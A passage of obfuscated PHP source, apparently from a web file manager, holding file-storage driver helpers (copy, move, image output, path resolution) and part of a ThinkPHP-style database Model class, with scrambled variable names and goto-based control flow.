$_SERVER[ã®Â„Éæ¹¤]; $DñÔ²Š¿¯¦ = $a©‚„¾‡­¡->getPath(rtrim($DñÔ²Š¿¯¦, $dï«¶ö¯Š„[8]) . $dï«¶ö¯Š„[8] . $dÏß“¸ÅÛ); $AÁº¦…¨¹× = $dï«¶ö¯Š„[1023] . time() . rand_string(5); goto fìòÍæİ‹Ş; Dæõ±ï¿ƒÎ: $EËÆëƒŸ¼ = $fœ¨Ø•ÈÛˆ->iconvApp($EËÆëƒŸ¼); $B„ßî­—¥¥ = $a©‚„¾‡­¡->upload($DñÔ²Š¿¯¦, $EËÆëƒŸ¼, $b™…÷±ù); self::remove($DËÀ²·ºœ . $AÁº¦…¨¹×); goto c»äº„¾¥; fìòÍæİ‹Ş: Hook::trigger($dï«¶ö¯Š„[1024], $fœ¨Ø•ÈÛˆ, $C¿ÌÎ¨Ò‚, $a©‚„¾‡­¡, $DñÔ²Š¿¯¦, $dÏß“¸ÅÛ, $AÁº¦…¨¹×); if (self::driverIsSame($fœ¨Ø•ÈÛˆ, $a©‚„¾‡­¡)) { if ($b™…÷±ù) { $B„ßî­—¥¥ = $a©‚„¾‡­¡->moveFile($C¿ÌÎ¨Ò‚, $DñÔ²Š¿¯¦); } else { $B„ßî­—¥¥ = $a©‚„¾‡­¡->copyFile($C¿ÌÎ¨Ò‚, $DñÔ²Š¿¯¦); } Hook::trigger($dï«¶ö¯Š„[1025], $fœ¨Ø•ÈÛˆ, $C¿ÌÎ¨Ò‚, $a©‚„¾‡­¡, $DñÔ²Š¿¯¦, $dÏß“¸ÅÛ, $B„ßî­—¥¥); return $B„ßî­—¥¥; } $DËÀ²·ºœ = TEMP_FILES; goto Fäœœîñ‘è; e›ê‰çŒŒ…: } public static function pathFather($cğíä„¨å) { $bô°›½«İà = IO::init($cğíä„¨å); $Cë©–ñé­¼ = $bô°›½«İà->pathFather($bô°›½«İà->path); return $bô°›½«İà->getPathOuter($Cë©–ñé­¼); } public static function fileOut($d¯çÍŸÀÖİ, $D´ÀÂ’©Ş¥ = false, $aÖ¾·ÜÃİ = false, $cÁŠšÛäÒí = '') { $c„—Ó©ºŒŠ = self::driverMake($d¯çÍŸÀÖİ); if ($c„—Ó©ºŒŠ->isFileOutServer()) { return $c„—Ó©ºŒŠ->fileOutServer($d¯çÍŸÀÖİ, $D´ÀÂ’©Ş¥, $aÖ¾·ÜÃİ, $cÁŠšÛäÒí); } return $c„—Ó©ºŒŠ->fileOut($d¯çÍŸÀÖİ, $D´ÀÂ’©Ş¥, $aÖ¾·ÜÃİ, $cÁŠšÛäÒí); } public static function fileOutImage($dä÷ğƒ¬áŠ, $bœ×‰Ñéæ = 250) { $dìª«òÒÈ° = array(250, 600, 1200, 3000); for ($A»´ïÁÕòŠ = 0; $A»´ïÁÕòŠ < count($dìª«òÒÈ°); $A»´ïÁÕòŠ++) { if ($A»´ïÁÕòŠ == 0 && $bœ×‰Ñéæ <= $dìª«òÒÈ°[$A»´ïÁÕòŠ]) { $bœ×‰Ñéæ = $dìª«òÒÈ°[$A»´ïÁÕòŠ]; break; } else { if ($bœ×‰Ñéæ > $dìª«òÒÈ°[$A»´ïÁÕòŠ - 1] && $bœ×‰Ñéæ <= $dìª«òÒÈ°[$A»´ïÁÕòŠ]) { $bœ×‰Ñéæ = $dìª«òÒÈ°[$A»´ïÁÕòŠ]; break; } else { if ($A»´ïÁÕòŠ == count($dìª«òÒÈ°) - 1 && $bœ×‰Ñéæ > $dìª«òÒÈ°[$A»´ïÁÕòŠ]) { $bœ×‰Ñéæ = $dìª«òÒÈ°[$A»´ïÁÕòŠ]; break; } } } } $Dˆ³ŞãƒŠ° = self::driverMake($dä÷ğƒ¬áŠ); if ($Dˆ³ŞãƒŠ°->isFileOutServer()) { return $Dˆ³ŞãƒŠ°->fileOutImageServer($dä÷ğƒ¬áŠ, $bœ×‰Ñéæ); } return $Dˆ³ŞãƒŠ°->fileOutImage($dä÷ğƒ¬áŠ, $bœ×‰Ñéæ); } private static function driverIsSame($dÓ— áËƒ, $d™º§”‰­ä) { goto Aè÷Áª¬•; Aè÷Áª¬•: $A„†µ¹±Ôñ =& $_SERVER[ã®Â„Éæ¹¤]; $C¬ãßÀ‘Æ = $dÓ— áËƒ->getType(); $F·Ë­š¸‘ = $d™º§”‰­ä->getType(); goto b’°²Ã‰ì†; b’°²Ã‰ì†: if ($C¬ãßÀ‘Æ != $F·Ë­š¸‘) { return !1; } if ($C¬ãßÀ‘Æ == $A„†µ¹±Ôñ[716]) { return !0; } if ($C¬ãßÀ‘Æ == $A„†µ¹±Ôñ[102]) { return !0; } goto d‹›Ì¶¬Š; d‹›Ì¶¬Š: if ($dÓ— áËƒ->pathDriver == $d™º§”‰­ä->pathDriver) { return !0; } return !1; goto D‘ÀÕ‹÷Åî; D‘ÀÕ‹÷Åî: } public static function copyUpdate($c‹†Ã¶×‚ğ, $fÉ×ã”Ø) { goto CŸÛÔöÙ‘›; fçïğŒ”: $cÂ÷Ğß—Äƒ = array(); foreach ($a¸Â¥´¤á as $F…ç¤ñŒ  => $e¶ã½‡ØĞ‹) { if (isset($aÅÓÔ¼º¦Ï[$F…ç¤ñŒ ])) { if ($e¶ã½‡ØĞ‹[$AÃÎ‹¬õ¯°[76]] == 1) { continue; } if ($aÅÓÔ¼º¦Ï[$F…ç¤ñŒ ][$AÃÎ‹¬õ¯°[77]] == $e¶ã½‡ØĞ‹[$AÃÎ‹¬õ¯°[77]]) { continue; } } if ($e¶ã½‡ØĞ‹[$AÃÎ‹¬õ¯°[76]] == 1) { $cÂ÷Ğß—Äƒ[] = $fÉ×ã”Ø . $AÃÎ‹¬õ¯°[8] . $F…ç¤ñŒ ; continue; } $Fœî–ËäÛÛ = strstr(trim($F…ç¤ñŒ , $AÃÎ‹¬õ¯°[8]), $AÃÎ‹¬õ¯°[8]) ? get_path_father($F…ç¤ñŒ ) : $AÃÎ‹¬õ¯°[33]; $BÈÚÌÑêæ[] = array($AÃÎ‹¬õ¯°[1026] => $e¶ã½‡ØĞ‹[$AÃÎ‹¬õ¯°[75]], $AÃÎ‹¬õ¯°[1027] => rtrim($fÉ×ã”Ø, $AÃÎ‹¬õ¯°[8]) . $AÃÎ‹¬õ¯°[8] . $Fœî–ËäÛÛ, $AÃÎ‹¬õ¯°[1028] => $e¶ã½‡ØĞ‹); } $a¯â¸Ñ•‹¤ = array($AÃÎ‹¬õ¯°[167] => $BÈÚÌÑêæ, $AÃÎ‹¬õ¯°[76] => $cÂ÷Ğß—Äƒ); goto cªÄ‰¥¹ß; CŸÛÔöÙ‘›: $AÃÎ‹¬õ¯° =& $_SERVER[ã®Â„Éæ¹¤]; if (!IO::exist($c‹†Ã¶×‚ğ)) { return !1; } if (!IO::exist($fÉ×ã”Ø)) { IO::mkdir($fÉ×ã”Ø); } goto d²ğÌµœ‘; d²ğÌµœ‘: $a¸Â¥´¤á = self::_listAll($c‹†Ã¶×‚ğ); $aÅÓÔ¼º¦Ï = self::_listAll($fÉ×ã”Ø); $BÈÚÌÑêæ = array(); goto fçïğŒ”; cªÄ‰¥¹ß: Hook::trigger($AÃÎ‹¬õ¯°[1029], $c‹†Ã¶×‚ğ, $fÉ×ã”Ø, $a¯â¸Ñ•‹¤); foreach ($cÂ÷Ğß—Äƒ as $e¶ã½‡ØĞ‹) { IO::mkdir($e¶ã½‡ØĞ‹); } foreach ($BÈÚÌÑêæ as $e¶ã½‡ØĞ‹) { IO::copy($e¶ã½‡ØĞ‹[$AÃÎ‹¬õ¯°[1026]], $e¶ã½‡ØĞ‹[$AÃÎ‹¬õ¯°[1027]], REPEAT_REPLACE); } goto eªë²é¾âæ; eªë²é¾âæ: } private static function _listAll($bÎŒùô‹èô) { $DßÍÔ›¬µÜ =& $_SERVER[ã®Â„Éæ¹¤]; $bÎŒùô‹èô = KodIO::clear($bÎŒùô‹èô); $eÙ÷Çƒ—Û = IO::listAll($bÎŒùô‹èô); foreach ($eÙ÷Çƒ—Û as &$d®¦±…œã) { $BÈô¦Í‹Å = substr($d®¦±…œã[$DßÍÔ›¬µÜ[75]], strlen($bÎŒùô‹èô)); $d®¦±…œã[$DßÍÔ›¬µÜ[1030]] = trim($BÈô¦Í‹Å, $DßÍÔ›¬µÜ[8]); } unset($d®¦±…œã); return array_to_keyvalue($eÙ÷Çƒ—Û, $DßÍÔ›¬µÜ[1030]); } public static function fileSubstr($C™‹ÌÆÚÓŸ, $A‹êƒ„Öéî, $BĞñ¾¸ÇÅ = false) { goto B¥œ÷ÂÅ„š; f…ğÄØß¤Å: if ($A‹êƒ„Öéî + $BĞñ¾¸ÇÅ > $eñ¨»Ìš¨§) { $BĞñ¾¸ÇÅ = $eñ¨»Ìš¨§ - $A‹êƒ„Öéî; } if ($BĞñ¾¸ÇÅ <= 0) { return $_SERVER[ã®Â„Éæ¹¤][33]; } if ($A‹êƒ„Öéî < 0 || $A‹êƒ„Öéî >= $eñ¨»Ìš¨§ || $BĞñ¾¸ÇÅ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\x52\x65\x61\144\40\145\x72\x72\x6f\x72\41\40\163\x74\141\x72\164\x3d{$A‹êƒ„Öéî}\x3b\x6c\x65\156\147\164\150\75{$BĞñ¾¸ÇÅ}\73\x20\163\x69\x7a\x65\x3d{$eñ¨»Ìš¨§}\x3b"); } goto C›‰à²æ; B¥œ÷ÂÅ„š: $e¥ˆ©“®‰ = self::driverMake($C™‹ÌÆÚÓŸ); $eñ¨»Ìš¨§ = $e¥ˆ©“®‰->size($C™‹ÌÆÚÓŸ); $c”¹ÃôªÊ† = $A‹êƒ„Öéî; goto b®™´Ò’õ²; C›‰à²æ: return $e¥ˆ©“®‰->fileSubstr($C™‹ÌÆÚÓŸ, $A‹êƒ„Öéî, $BĞñ¾¸ÇÅ); goto AÒ®ó¾‹ì; b®™´Ò’õ²: $Bµ×‹‚©²ò = $BĞñ¾¸ÇÅ; if ($A‹êƒ„Öéî < 0) { $A‹êƒ„Öéî = $eñ¨»Ìš¨§ + $A‹êƒ„Öéî; } if ($BĞñ¾¸ÇÅ === !1) { $BĞñ¾¸ÇÅ = $eñ¨»Ìš¨§ - $A‹êƒ„Öéî; } goto f…ğÄØß¤Å; AÒ®ó¾‹ì: } private static function driverMake(&$E´Ë¬˜ÜÔô) { goto d½Ú°òƒğÍ; bĞÑìÜîé: if ($F§¿Ñ³±[$fÁÇêŸ¹î¢[29]] == KodIO::KOD_IO && !self::$driverListSystem[$F§¿Ñ³±[$fÁÇêŸ¹î¢[367]]]) { return !1; } $E´Ë¬˜ÜÔô = $F§¿Ñ³±[$fÁÇêŸ¹î¢[1031]]; $b²Û±«ù· = self::driverGet($F§¿Ñ³±, $E´Ë¬˜ÜÔô); goto E‹Š§íà¨; E‹Š§íà¨: return $b²Û±«ù·; goto AÉ•Ê¶Ì³; d½Ú°òƒğÍ: $fÁÇêŸ¹î¢ =& $_SERVER[ã®Â„Éæ¹¤]; $F§¿Ñ³± = KodIO::parse($E´Ë¬˜ÜÔô); if (!self::$driverListSystem) { $cìé£¹ŸĞ¨ = Model($fÁÇêŸ¹î¢[725])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($cìé£¹ŸĞ¨, $fÁÇêŸ¹î¢[367]); } goto bĞÑìÜîé; AÉ•Ê¶Ì³: } private static function driverGet($c‚‘ˆÖÀÄé, &$bì»™È©ÚÜ) { goto Bº‰­”–‘†; b„¥İÍŠº: if (isset($c¤‚îİÕó—[$bö•ÜÖ„Å[6]][$bö•ÜÖ„Å[1043]])) { $eåÆ‰¬©Â->pathBase = rtrim($c¤‚îİÕó—[$bö•ÜÖ„Å[6]][$bö•ÜÖ„Å[1043]], $bö•ÜÖ„Å[8]) . $bö•ÜÖ„Å[8]; $bì»™È©ÚÜ = $eåÆ‰¬©Â->pathBase . ltrim($bì»™È©ÚÜ, $bö•ÜÖ„Å[8]); } $bì»™È©ÚÜ = $eåÆ‰¬©Â->getPath($bì»™È©ÚÜ); if (isset($c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[1017]])) { $bì»™È©ÚÜ = $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[1017]]; } goto C›®²§ƒÉŞ; E…šóì£š­: $eåÆ‰¬©Â = self::$driverCache[$Fˆ˜Ü±™´Œ]; $eåÆ‰¬©Â->pathDriver = $b®Ÿ¦î³‚¸; $eåÆ‰¬©Â->pathBase = $bö•ÜÖ„Å[33]; goto b„¥İÍŠº; Bº‰­”–‘†: $bö•ÜÖ„Å =& $_SERVER[ã®Â„Éæ¹¤]; $b®Ÿ¦î³‚¸ = $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[1032]]; $dÒ‚ÎÉˆª† = $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[367]]; goto B‹ÊˆˆˆäÄ; B‹ÊˆˆˆäÄ: switch ($c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[29]]) { case KodIO::KOD_IO: $c¤‚îİÕó— = self::$driverListSystem[$dÒ‚ÎÉˆª†]; break; case KodIO::KOD_SOURCE: $bì»™È©ÚÜ = $dÒ‚ÎÉˆª† . $bì»™È©ÚÜ; $c¤‚îİÕó— = array($bö•ÜÖ„Å[1033] => $bö•ÜÖ„Å[1034], $bö•ÜÖ„Å[6] => $c‚‘ˆÖÀÄé); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $bñ‘Á­ = $GLOBALS[$bö•ÜÖ„Å[1035]]; self::$driverListUser = array_to_keyvalue($bñ‘Á­, $bö•ÜÖ„Å[367]); } $c¤‚îİÕó— = self::$driverListUser[$dÒ‚ÎÉˆª†]; break; case KodIO::KOD_SHARE_LINK: $c¤‚îİÕó— = array($bö•ÜÖ„Å[1033] => $bö•ÜÖ„Å[1036], $bö•ÜÖ„Å[6] => $c‚‘ˆÖÀÄé); $EÌº‹áŒ–Ù = Action($bö•ÜÖ„Å[1037])->sharePathInfo($c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[75]]); $bì»™È©ÚÜ = $EÌº‹áŒ–Ù[$bö•ÜÖ„Å[369]]; if (!$EÌº‹áŒ–Ù[$bö•ÜÖ„Å[369]]) { $DœÎÔ“°¼ = Model($bö•ÜÖ„Å[537])->getInfo($EÌº‹áŒ–Ù[$bö•ÜÖ„Å[441]]); $bì»™È©ÚÜ = KodIO::clear($DœÎÔ“°¼[$bö•ÜÖ„Å[1038]] . $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[1031]]); $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[439]] = $DœÎÔ“°¼; $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[1017]] = $bì»™È©ÚÜ; $c¤‚îİÕó— = array($bö•ÜÖ„Å[1033] => $bö•ÜÖ„Å[1039], $bö•ÜÖ„Å[6] => $c‚‘ˆÖÀÄé); } break; case KodIO::KOD_SHARE_ITEM: $c¤‚îİÕó— = array($bö•ÜÖ„Å[1033] => $bö•ÜÖ„Å[1040], $bö•ÜÖ„Å[6] => $c‚‘ˆÖÀÄé); $DœÎÔ“°¼ = Model($bö•ÜÖ„Å[537])->getInfo($c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[367]]); if ($DœÎÔ“°¼[$bö•ÜÖ„Å[369]] == $bö•ÜÖ„Å[470]) { $bì»™È©ÚÜ = KodIO::clear($DœÎÔ“°¼[$bö•ÜÖ„Å[1038]] . $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[1031]]); $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[439]] = $DœÎÔ“°¼; $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[1017]] = $bì»™È©ÚÜ; $c¤‚îİÕó— = array($bö•ÜÖ„Å[1033] => $bö•ÜÖ„Å[1041], $bö•ÜÖ„Å[6] => $c‚‘ˆÖÀÄé); } else { if (!$bì»™È©ÚÜ) { $bì»™È©ÚÜ = $DœÎÔ“°¼[$bö•ÜÖ„Å[369]]; } } break; default: $bì»™È©ÚÜ = $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[75]]; $c¤‚îİÕó— = array($bö•ÜÖ„Å[1033] => $bö•ÜÖ„Å[1042]); break; } $Fˆ˜Ü±™´Œ = $c‚‘ˆÖÀÄé[$bö•ÜÖ„Å[75]]; if (!isset(self::$driverCache[$Fˆ˜Ü±™´Œ])) { $C¸×Ÿé¢Œ = strtolower($c¤‚îİÕó—[$bö•ÜÖ„Å[90]]); $Cíñ£½µ§‰ = $GLOBALS[$bö•ÜÖ„Å[6]][$bö•ÜÖ„Å[84]][$bö•ÜÖ„Å[776]]; $FõĞ˜¡†ç· = $bö•ÜÖ„Å[71] . (isset($Cíñ£½µ§‰[$C¸×Ÿé¢Œ]) ? $Cíñ£½µ§‰[$C¸×Ÿé¢Œ] : ucfirst($C¸×Ÿé¢Œ)); if (!class_exists($FõĞ˜¡†ç·)) { show_json("{$FõĞ˜¡†ç·}\x20\x6e\157\164\x20\145\170\x69\x73\164\x73\41", !1); } $bïÜŠ½øÂù = isset($c¤‚îİÕó—[$bö•ÜÖ„Å[6]]) ? $c¤‚îİÕó—[$bö•ÜÖ„Å[6]] : !1; self::$driverCache[$Fˆ˜Ü±™´Œ] = new $FõĞ˜¡†ç·($bïÜŠ½øÂù); } goto E…šóì£š­; C›®²§ƒÉŞ: $eåÆ‰¬©Â->path = $bì»™È©ÚÜ; return $eåÆ‰¬©Â; goto fƒ²øšëÏ; fƒ²øšëÏ: } } goto eô÷­¹Ã¯İ; dç±…À®ÔÈ: define($_SERVER[ã®Â„Éæ¹¤][230], 0); define($_SERVER[ã®Â„Éæ¹¤][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\x6f\162\x64\145\x72", "\x61\154\151\141\163", "\x68\141\x76\151\x6e\147", "\147\x72\x6f\165\160", "\x6c\157\143\153", "\144\151\163\x74\x69\156\143\x74", "\141\x75\x74\157", "\x66\x69\154\x74\145\162", "\166\x61\x6c\151\x64\x61\x74\145", "\x72\x65\x73\165\154\164", "\142\x69\156\x64", "\x74\157\x6b\145\x6e"); public function __construct($B”ç†ƒ‡° = '', $b˜˜§‡î­½ = '', $D‹¿”Š°¤Ğ = '') { $a¬˜é”¸˜¨ =& $_SERVER[ã®Â„Éæ¹¤]; $this->_initialize(); if (!empty($B”ç†ƒ‡°)) { if (strpos($B”ç†ƒ‡°, $a¬˜é”¸˜¨[91])) { list($this->dbName, $this->name) = explode($a¬˜é”¸˜¨[91], $B”ç†ƒ‡°); } else { $this->name = $B”ç†ƒ‡°; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($b˜˜§‡î­½)) { $this->tablePrefix = $a¬˜é”¸˜¨[33]; } elseif ($a¬˜é”¸˜¨[33] != $b˜˜§‡î­½) { $this->tablePrefix = $b˜˜§‡î­½; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($a¬˜é”¸˜¨[232]); } $this->db(0, empty($this->connection) ? $D‹¿”Š°¤Ğ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $EÕ·˜öæòŒ =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($this->fields)) { if (think_config($EÕ·˜öæòŒ[233])) { $AŞ ØÙÌÈà = $this->dbName ? $this->dbName : think_config($EÕ·˜öæòŒ[234]); $Aƒï¶†ßŒİ = think_var_cache($EÕ·˜öæòŒ[235] . strtolower(get_path_this($AŞ ØÙÌÈà) . $EÕ·˜öæòŒ[91] . $this->name)); if ($Aƒï¶†ßŒİ) { $Eà¸”éâÖ¯ = think_config($EÕ·˜öæòŒ[236]); if (empty($Eà¸”éâÖ¯) || $Aƒï¶†ßŒİ[$EÕ·˜öæòŒ[237]] == $Eà¸”éâÖ¯) { $this->fields = $Aƒï¶†ßŒİ; return; } } } $this->flush(); } } public function flush() { goto BÇÉÔÅ‡¥; AÙ¹Ã¸ˆé”: foreach ($dùª‡’â‚ as $aØİ¾µÁ³š => $CÕîğÍ÷) { $dŸˆƒ•ŸÄÇ[$aØİ¾µÁ³š] = $CÕîğÍ÷[$A‘î”à±Üš[29]]; if ($CÕîğÍ÷[$A‘î”à±Üš[36]]) { $this->fields[$A‘î”à±Üš[239]] = $aØİ¾µÁ³š; if ($CÕîğÍ÷[$A‘î”à±Üš[39]]) { $this->fields[$A‘î”à±Üš[238]] = !0; } } } $this->fields[$A‘î”à±Üš[240]] = $dŸˆƒ•ŸÄÇ; if (think_config($A‘î”à±Üš[236])) { $this->fields[$A‘î”à±Üš[237]] = think_config($A‘î”à±Üš[236]); } goto CÉÌ…ôôóç; DÈëÊ¶¶Ã: if (!$dùª‡’â‚) { return !1; } $this->fields = array_keys($dùª‡’â‚); $this->fields[$A‘î”à±Üš[238]] = !1; goto AÙ¹Ã¸ˆé”; BÇÉÔÅ‡¥: $A‘î”à±Üš =& $_SERVER[ã®Â„Éæ¹¤]; $this->db->setModel($this->name); $dùª‡’â‚ = $this->db->getFields($this->getTableName()); goto DÈëÊ¶¶Ã; CÉÌ…ôôóç: if (think_config($A‘î”à±Üš[233])) { $EË±Œ¢–—Ğ = $this->dbName ? $this->dbName : think_config($A‘î”à±Üš[234]); think_var_cache($A‘î”à±Üš[235] . strtolower(get_path_this($EË±Œ¢–—Ğ) . $A‘î”à±Üš[91] . $this->name), $this->fields); } goto F•‰Ñ¼çáÇ; F•‰Ñ¼çáÇ: } public function switchModel($Bö‘ïŞª·¥, $fã¸ë½Å’¸ = array()) { $f ³½‹†æĞ =& $_SERVER[ã®Â„Éæ¹¤]; $e”Ñäƒ¶ñ¢ = ucwords(strtolower($Bö‘ïŞª·¥)) . $f ³½‹†æĞ[241]; if (!class_exists($e”Ñäƒ¶ñ¢)) { think_exception($e”Ñäƒ¶ñ¢ . think_lang($f ³½‹†æĞ[242])); } $this->_extModel = new $e”Ñäƒ¶ñ¢($this->name); if (!empty($fã¸ë½Å’¸)) { foreach ($fã¸ë½Å’¸ as $e·šÎêÙ¦¥) { $this->_extModel->setProperty($e·šÎêÙ¦¥, $this->{$e·šÎêÙ¦¥}); } } return $this->_extModel; } public function __set($e‘Ÿáê´—Œ, $E¸İäêƒ) { $this->data[$e‘Ÿáê´—Œ] = $E¸İäêƒ; } public function __get($Dñ¼»¤êĞÅ) { return isset($this->data[$Dñ¼»¤êĞÅ]) ? $this->data[$Dñ¼»¤êĞÅ] : null; } public function __isset($d„å¸„–óÜ) { return isset($this->data[$d„å¸„–óÜ]); } public function __unset($cÍ«ø½©·) { unset($this->data[$cÍ«ø½©·]); } public function __call($dÑÂ—¹÷ø„, $aØñº†ˆ„¦) { $bÛãÂÈ =& $_SERVER[ã®Â„Éæ¹¤]; if (in_array(strtolower($dÑÂ—¹÷ø„), $this->methods, !0)) { $this->options[strtolower($dÑÂ—¹÷ø„)] = $aØñº†ˆ„¦[0]; return $this; } elseif (in_array(strtolower($dÑÂ—¹÷ø„), array($bÛãÂÈ[243], $bÛãÂÈ[244], $bÛãÂÈ[245], $bÛãÂÈ[246], $bÛãÂÈ[247]), !0)) { $EçÖøØ”†Ù = isset($aØñº†ˆ„¦[0]) ? $aØñº†ˆ„¦[0] : $bÛãÂÈ[176]; $EçÖøØ”†Ù = $this->db->parseKey($EçÖøØ”†Ù); return $this->getField(strtoupper($dÑÂ—¹÷ø„) . $bÛãÂÈ[248] . $EçÖøØ”†Ù . $bÛãÂÈ[249] . $dÑÂ—¹÷ø„, $bÛãÂÈ[243]); } elseif (strtolower(substr($dÑÂ—¹÷ø„, 0, 5)) == $bÛãÂÈ[250]) { $EçÖøØ”†Ù = think_parse_name(substr($dÑÂ—¹÷ø„, 5)); $E’±ÏŸ£Â[$EçÖøØ”†Ù] = $aØñº†ˆ„¦[0]; return $this->where($E’±ÏŸ£Â)->find(); } elseif (strtolower(substr($dÑÂ—¹÷ø„, 0, 10)) == $bÛãÂÈ[251]) { $cãÇÔñÆÁÎ = think_parse_name(substr($dÑÂ—¹÷ø„, 10)); $E’±ÏŸ£Â[$cãÇÔñÆÁÎ] = $aØñº†ˆ„¦[0]; return $this->where($E’±ÏŸ£Â)->getField($aØñº†ˆ„¦[1]); } elseif (isset($this->_scope[$dÑÂ—¹÷ø„])) { return $this->scope($dÑÂ—¹÷ø„, $aØñº†ˆ„¦[0]); } elseif (method_exists($this, $dÑÂ—¹÷ø„)) { array_unshift($aØñº†ˆ„¦, $dÑÂ—¹÷ø„); return call_user_func_array(array($this, $bÛãÂÈ[252]), $aØñº†ˆ„¦); } else { return call_user_func_array(array(parent, $dÑÂ—¹÷ø„), $aØñº†ˆ„¦); } } protected function call() { goto BìÁ…‡Œàè; BìÁ…‡Œàè: $Cñ¦Î˜ë’¯ =& $_SERVER[ã®Â„Éæ¹¤]; $c™ß Şì•á = func_get_args(); $A™âƒŞôŠŠ = array_shift($c™ß Şì•á); goto Fà¹ñÔë×…; Eëø“æÈÔ: $B±ÛçíÛ„ = call_user_func_array(array($this, $A™âƒŞôŠŠ), $c™ß Şì•á); if (method_exists($this, $Cñ¦Î˜ë’¯[256])) { $AØ­³ºÚÜ = call_user_func_array(array($this, $Cñ¦Î˜ë’¯[257]), array($Fá˜†’¥Ÿ, $c™ß Şì•á, $B±ÛçíÛ„)); if ($AØ­³ºÚÜ) { return $AØ­³ºÚÜ; } } return $B±ÛçíÛ„; goto bİÃËŒ˜‰ß; E™İ§«‹Õ°: if (isset($c™ß Şì•á[$Dù‰¥µ ½í]) && $c™ß Şì•á[$Dù‰¥µ ½í] === $A™âƒŞôŠŠ) { think_exception(__CLASS__ . $Cñ¦Î˜ë’¯[4] . $A™âƒŞôŠŠ . think_lang($Cñ¦Î˜ë’¯[253])); return; } $c™ß Şì•á[] = $A™âƒŞôŠŠ; if (method_exists($this, $Cñ¦Î˜ë’¯[254])) { $AØ­³ºÚÜ = call_user_func_array(array($this, $Cñ¦Î˜ë’¯[255]), array($Fá˜†’¥Ÿ, $c™ß Şì•á)); if (!is_null($AØ­³ºÚÜ) && $AØ­³ºÚÜ !== !1) { return $AØ­³ºÚÜ; } } goto Eëø“æÈÔ; Fà¹ñÔë×…: $Fá˜†’¥Ÿ = $A™âƒŞôŠŠ; if (is_array($A™âƒŞôŠŠ)) { $Fá˜†’¥Ÿ = $A™âƒŞôŠŠ[1]; $A™âƒŞôŠŠ = $A™âƒŞôŠŠ[0]; } $Dù‰¥µ ½í = count($c™ß Şì•á) - 1; goto E™İ§«‹Õ°; bİÃËŒ˜‰ß: } protected function _initialize() { } protected function _facade($cÆØç‚Å„¨) { $BŒ”åŞè =& $_SERVER[ã®Â„Éæ¹¤]; if (!empty($this->fields)) { foreach ($cÆØç‚Å„¨ as $FîØšò„áê => $c¥‡ì·ï¡) { if (!in_array($FîØšò„áê, $this->fields, !0)) { unset($cÆØç‚Å„¨[$FîØšò„áê]); } elseif (is_scalar($c¥‡ì·ï¡)) { $this->_parseType($cÆØç‚Å„¨, $FîØšò„áê); } } } if (!empty($this->options[$BŒ”åŞè[258]])) { $cÆØç‚Å„¨ = array_map($this->options[$BŒ”åŞè[258]], $cÆØç‚Å„¨); unset($this->options[$BŒ”åŞè[258]]); } $this->_beforeWrite($cÆØç‚Å„¨); return $cÆØç‚Å„¨; } protected function _beforeWrite(&$aí¢Û¡Ú“) { } public function add($FÛÇŞˆÍ‡ = '', $Bö™ÂŒ ¤Ü = array(), $e­ªæÅ°Ûá = false) { goto f·•‹¹Ì“ï; f·•‹¹Ì“ï: if (empty($FÛÇŞˆÍ‡)) { if (!empty($this->data)) { $FÛÇŞˆÍ‡ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ã®Â„Éæ¹¤][259]); return !1; } } $Bö™ÂŒ ¤Ü = $this->_parseOptions($Bö™ÂŒ ¤Ü); $FÛÇŞˆÍ‡ = $this->_facade($FÛÇŞˆÍ‡); goto FË«´Ø±«ï; eŠµ„Îãö: return $a“’Ş“àÌ©; goto a»„ñïÚ˜ï; FË«´Ø±«ï: if (!1 === $this->_beforeInsert($FÛÇŞˆÍ‡, $Bö™ÂŒ ¤Ü)) { return !1; } $a“’Ş“àÌ© = $this->db->insert($FÛÇŞˆÍ‡, $Bö™ÂŒ ¤Ü, $e­ªæÅ°Ûá); if (!1 !== $a“’Ş“àÌ©) { $b˜ãÊËÌØò = $this->getLastInsID(); if ($b˜ãÊËÌØò) { $FÛÇŞˆÍ‡[$this->getPk()] = $b˜ãÊËÌØò; $this->_after_insert($FÛÇŞˆÍ‡, $Bö™ÂŒ ¤Ü); return $b˜ãÊËÌØò; } $this->_after_insert($FÛÇŞˆÍ‡, $Bö™ÂŒ ¤Ü); } goto eŠµ„Îãö; a»„ñïÚ˜ï: } protected function _beforeInsert(&$Bí¼İ”¿Õ, $c‚ëÕ£›Î¯) { } protected function _after_insert($D¬È¿Æ©ŠÍ, $D³ºí‹ˆÀ) { } public function addAll($FïÉµÙ…ß, $cÄ›„¹³¾‡ = array(), $e¸¶¨ĞóÅÅ = false) { goto c‡éµ´Ã…å; bë¡áŸ‡ƒÅ: return $B›òÓö°¥ù; goto E™ŒİÈáä„; aéÌ•Á§ˆ: foreach ($FïÉµÙ…ß as $e°Œõ†©¨ => $F‚„Òæ‹) { $FïÉµÙ…ß[$e°Œõ†©¨] = $this->_facade($F‚„Òæ‹); } if (method_exists($this->db, $EØëä«™íà[260])) { 